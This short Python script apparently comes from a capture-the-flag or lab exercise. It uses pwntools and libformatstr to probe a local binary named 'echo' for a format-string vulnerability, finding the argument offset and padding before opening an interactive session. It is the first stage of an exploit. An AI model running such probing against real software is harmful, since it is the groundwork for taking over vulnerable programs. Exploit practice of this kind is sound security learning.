from pwn import *
from libformatstr import *
from binascii import *
context.log_level = 'debug'

p="./echo"
context.binary=p
elf=ELF(p)
io=process(p)
bufsize=100
io.sendline(make_pattern(bufsize))
data = io.recv()                                 # server's response
offset, padding = guess_argnum(data, bufsize)    # find format string offset and padding
log.info("offset : " + str(offset))
log.info("padding: " + str(padding))

io.interactive()
